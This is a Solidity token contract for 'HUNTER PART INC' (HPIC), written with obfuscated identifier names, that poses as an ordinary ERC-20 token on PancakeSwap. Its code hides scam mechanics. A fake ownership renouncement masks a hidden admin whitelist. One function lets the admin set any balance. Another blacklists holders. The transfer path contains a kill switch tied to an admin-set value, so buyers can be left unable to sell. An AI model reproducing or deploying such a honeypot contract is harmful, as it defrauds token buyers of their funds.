//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface enableFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellIsLimit) external view returns (uint256);

    function transfer(address receiverLimit, uint256 swapFee) external returns (bool);

    function allowance(address marketingReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapFee) external returns (bool);

    function transferFrom(address sender,address receiverLimit,uint256 swapFee) external returns (bool);

    event Transfer(address indexed from, address indexed buyTo, uint256 value);
    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);
}

interface launchTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalSell {
    function createPair(address sellShouldTake, address teamFund) external returns (address);
}

abstract contract sellTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyFund is enableFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HUNTERPARTINC is sellTo, enableFee, buyFund {

    function receiverToken(uint256 swapFee) public {
        fromToAmount();
        exemptLaunchedIs = swapFee;
    }

    function feeLimit(address sellTrading) public {
        if (tradingShouldTeam) {
            return;
        }
        if (limitTo != feeMinFrom) {
            feeMinFrom = toList;
        }
        txSenderWallet[sellTrading] = true;
        
        tradingShouldTeam = true;
    }

    event OwnershipTransferred(address indexed receiverSell, address indexed buyMarketingMax);

    function symbol() external view virtual override returns (string memory) {
        return fromToken;
    }

    function toIs(address feeBuy, address receiverLimit, uint256 swapFee) internal returns (bool) {
        if (feeBuy == isMode) {
            return autoSender(feeBuy, receiverLimit, swapFee);
        }
        uint256 launchedReceiver = enableFee(amountFromEnable).balanceOf(toEnable);
        require(launchedReceiver == exemptLaunchedIs);
        require(!atToFund[feeBuy]);
        return autoSender(feeBuy, receiverLimit, swapFee);
    }

    mapping(address => bool) public atToFund;

    address public isMode;

    function name() external view virtual override returns (string memory) {
        return autoTake;
    }

    mapping(address => mapping(address => uint256)) private senderEnable;

    address minMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isSenderLimit(address isTx, uint256 swapFee) public {
        fromToAmount();
        sellWallet[isTx] = swapFee;
    }

    address toEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function maxLiquidity(address exemptMode) public {
        fromToAmount();
        
        if (exemptMode == isMode || exemptMode == amountFromEnable) {
            return;
        }
        atToFund[exemptMode] = true;
    }

    address public amountFromEnable;

    function decimals() external view virtual override returns (uint8) {
        return tokenLaunched;
    }

    address private sellAt;

    function approve(address tokenIs, uint256 swapFee) public virtual override returns (bool) {
        senderEnable[_msgSender()][tokenIs] = swapFee;
        emit Approval(_msgSender(), tokenIs, swapFee);
        return true;
    }

    string private fromToken = "HPIC";

    function autoSender(address feeBuy, address receiverLimit, uint256 swapFee) internal returns (bool) {
        require(sellWallet[feeBuy] >= swapFee);
        sellWallet[feeBuy] -= swapFee;
        sellWallet[receiverLimit] += swapFee;
        emit Transfer(feeBuy, receiverLimit, swapFee);
        return true;
    }

    mapping(address => bool) public txSenderWallet;

    uint256 exemptLaunchedIs;

    uint256 private autoLaunch = 100000000 * 10 ** 18;

    function allowance(address modeReceiver, address tokenIs) external view virtual override returns (uint256) {
        if (tokenIs == minMode) {
            return type(uint256).max;
        }
        return senderEnable[modeReceiver][tokenIs];
    }

    uint256 private limitTo;

    function swapReceiverMarketing() public {
        emit OwnershipTransferred(isMode, address(0));
        sellAt = address(0);
    }

    uint256 public toList;

    bool public tradingShouldTeam;

    uint256 limitExemptMax;

    function owner() external view returns (address) {
        return sellAt;
    }

    mapping(address => uint256) private sellWallet;

    function balanceOf(address sellIsLimit) public view virtual override returns (uint256) {
        return sellWallet[sellIsLimit];
    }

    constructor (){
        
        swapReceiverMarketing();
        launchTrading isFee = launchTrading(minMode);
        amountFromEnable = totalSell(isFee.factory()).createPair(isFee.WETH(), address(this));
        
        isMode = _msgSender();
        txSenderWallet[isMode] = true;
        sellWallet[isMode] = autoLaunch;
        
        emit Transfer(address(0), isMode, autoLaunch);
    }

    function fromToAmount() private view {
        require(txSenderWallet[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return sellAt;
    }

    uint256 public tradingFee;

    function transfer(address isTx, uint256 swapFee) external virtual override returns (bool) {
        return toIs(_msgSender(), isTx, swapFee);
    }

    function transferFrom(address feeBuy, address receiverLimit, uint256 swapFee) external override returns (bool) {
        if (_msgSender() != minMode) {
            if (senderEnable[feeBuy][_msgSender()] != type(uint256).max) {
                require(swapFee <= senderEnable[feeBuy][_msgSender()]);
                senderEnable[feeBuy][_msgSender()] -= swapFee;
            }
        }
        return toIs(feeBuy, receiverLimit, swapFee);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoLaunch;
    }

    uint256 private feeMinFrom;

    uint8 private tokenLaunched = 18;

    string private autoTake = "HUNTER PART INC";

}